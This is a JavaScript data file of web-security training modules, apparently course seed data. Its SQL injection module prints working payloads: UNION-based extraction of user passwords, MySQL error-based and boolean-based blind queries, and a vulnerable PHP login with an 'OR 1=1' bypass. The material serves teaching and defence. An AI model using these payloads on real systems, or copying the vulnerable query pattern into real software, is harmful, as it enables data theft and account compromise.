// Complete Web Application Security Training Modules
// 6 modules total: 2 per difficulty level (beginner, intermediate, advanced)

const allWebSecurityModules = [
  // BEGINNER LEVEL - 2 modules
  {
    title: "Web Security Fundamentals",
    description: "Introduction to web application security concepts, basic vulnerabilities, and security principles.",
    category: "web-security",
    difficulty: "beginner",
    duration: 120,
    tags: ["fundamentals", "owasp", "http", "authentication", "session-management"],
    isPublished: true
  },
  {
    title: "Introduction to XSS and CSRF",
    description: "Understanding Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) attacks with practical examples and prevention techniques.",
    category: "web-security",
    difficulty: "beginner",
    duration: 90,
    tags: ["xss", "csrf", "owasp", "injection", "browser-security"],
    isPublished: true
  },
  
  // INTERMEDIATE LEVEL - 2 modules
  {
    title: "SQL Injection and Database Security",
    description: "Comprehensive guide to SQL injection attacks, NoSQL injection, and database security best practices.",
    category: "web-security",
    difficulty: "intermediate",
    duration: 150,
    overview: {
      objectives: [
        "Master SQL injection attack techniques",
        "Understand different types of SQL injection",
        "Learn secure coding practices for database interactions",
        "Implement effective prevention strategies"
      ],
      prerequisites: [
        "Web Security Fundamentals module",
        "Basic SQL knowledge",
        "Understanding of web application architecture"
      ],
      outcomes: [
        "Can identify and exploit SQL injection vulnerabilities",
        "Knows how to implement secure database queries",
        "Understands advanced injection techniques"
      ]
    },
    pages: [
      {
        title: "Introduction to SQL Injection",
        content: `# SQL Injection - The Database Threat

SQL Injection remains one of the most critical web application vulnerabilities, consistently ranking #1 in the OWASP Top 10.

## What is SQL Injection?

SQL Injection occurs when an attacker can insert or manipulate SQL queries by injecting malicious SQL code into application inputs that are incorporated into database queries without proper sanitization.

## Why SQL Injection is Critical

- **Data Breaches**: Access to entire databases
- **Data Manipulation**: Unauthorized modifications
- **Authentication Bypass**: Direct login bypasses
- **System Compromise**: Operating system access
- **Business Impact**: Compliance violations and financial losses

## Types of SQL Injection

1. **Classic (In-band) SQL Injection**
2. **Blind SQL Injection**
3. **Time-based Blind SQL Injection**
4. **Out-of-band SQL Injection**
5. **Second-order SQL Injection**

## Common Vulnerable Scenarios

- Dynamic query construction
- User input in WHERE clauses
- ORDER BY clause manipulation
- LIMIT clause injection
- Stored procedure calls`,
        pageNumber: 1,
        type: "introduction",
        keyPoints: [
          "SQL injection allows database manipulation",
          "Multiple types exist with different exploitation methods",
          "Can lead to complete system compromise",
          "Affects all database management systems"
        ]
      },
      {
        title: "Classic SQL Injection Techniques",
        content: `# Classic SQL Injection Exploitation

Classic SQL injection provides immediate feedback, making it easier to exploit and detect.

## Union-based Injection

### Technique Overview
- Uses UNION SELECT to combine results
- Requires knowledge of column count and data types
- Most straightforward exploitation method

### Column Count Discovery
\`\`\`sql
-- Method 1: ORDER BY
' ORDER BY 1-- (works)
' ORDER BY 2-- (works)  
' ORDER BY 3-- (error = 2 columns)

-- Method 2: UNION SELECT
' UNION SELECT NULL-- (error)
' UNION SELECT NULL,NULL-- (works = 2 columns)
\`\`\`

### Data Extraction
\`\`\`sql
-- Extract database information
' UNION SELECT database(),version()--
' UNION SELECT table_name,column_name FROM information_schema.columns--
' UNION SELECT username,password FROM users--
\`\`\`

## Error-based Injection

### Using Database Errors
- Deliberate error generation
- Information disclosure through error messages
- Useful when UNION attacks fail

### MySQL Error-based Techniques
\`\`\`sql
-- ExtractValue function
' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))--

-- UpdateXML function
' AND 1=updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)--
\`\`\`

## Boolean-based Injection

### Logical Tests
- True/false responses
- Application behavior differences
- No direct data output

### Example Payloads
\`\`\`sql
-- Test for vulnerability
' AND 1=1-- (normal response)
' AND 1=2-- (different response)

-- Extract data character by character
' AND (SELECT LENGTH(database()))=8--
' AND (SELECT SUBSTRING(database(),1,1))='m'--
\`\`\``,
        pageNumber: 2,
        type: "example",
        codeExamples: [
          {
            language: "sql",
            code: `-- Vulnerable PHP code example
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysql_query($query);

-- Attack payload
username: admin' OR '1'='1'--
password: anything

-- Resulting query
SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='anything'`,
            description: "Classic authentication bypass"
          }
        ],
        keyPoints: [
          "Union-based attacks combine query results",
          "Error-based injection uses database error messages",
          "Boolean-based attacks infer data from application behavior",
          "Each technique requires different exploitation strategies"
        ]
      }
      // ... continue with remaining pages
    ],
    quiz: {
      questions: [
        {
          question: "Which SQL injection technique combines query results to extract data?",
          type: "multiple-choice",
          options: ["Boolean-based", "Union-based", "Time-based", "Error-based"],
          correctAnswer: 1,
          explanation: "Union-based SQL injection uses the UNION SELECT statement to combine results from multiple queries.",
          difficulty: "medium",
          points: 2
        }
      ],
      passingScore: 70,
      timeLimit: 25,
      maxAttempts: 3
    },
    tags: ["sql-injection", "database-security", "owasp", "injection", "data-security"],
    isPublished: true
  },
  {
    title: "Authentication and Session Security",
    description: "Advanced authentication mechanisms, session security, JWT tokens, and OAuth implementation.",
    category: "web-security",
    difficulty: "intermediate",
    duration: 135,
    overview: {
      objectives: [
        "Implement secure authentication systems",
        "Master session security best practices",
        "Understand JWT and token-based authentication",
        "Learn OAuth 2.0 and OpenID Connect"
      ]
    },
    tags: ["authentication", "jwt", "oauth", "session-security", "identity-management"],
    isPublished: true
  },
  
  // ADVANCED LEVEL - 2 modules
  {
    title: "Advanced Web Application Attacks",
    description: "Comprehensive coverage of advanced attack techniques including deserialization, XXE, SSRF, and template injection.",
    category: "web-security",
    difficulty: "advanced",
    duration: 180,
    overview: {
      objectives: [
        "Master advanced attack techniques",
        "Understand complex exploitation scenarios",
        "Learn advanced evasion techniques",
        "Implement comprehensive security solutions"
      ]
    },
    tags: ["advanced-attacks", "deserialization", "xxe", "ssrf", "template-injection"],
    isPublished: true
  },
  {
    title: "Secure Development and Code Review",
    description: "Advanced secure development lifecycle, code review techniques, and security testing methodologies.",
    category: "web-security",
    difficulty: "advanced", 
    duration: 165,
    overview: {
      objectives: [
        "Implement secure development lifecycle",
        "Master security code review techniques",
        "Design secure architectures",
        "Lead security initiatives"
      ]
    },
    tags: ["secure-development", "code-review", "sdlc", "security-architecture"],
    isPublished: true
  }
];

module.exports = allWebSecurityModules;
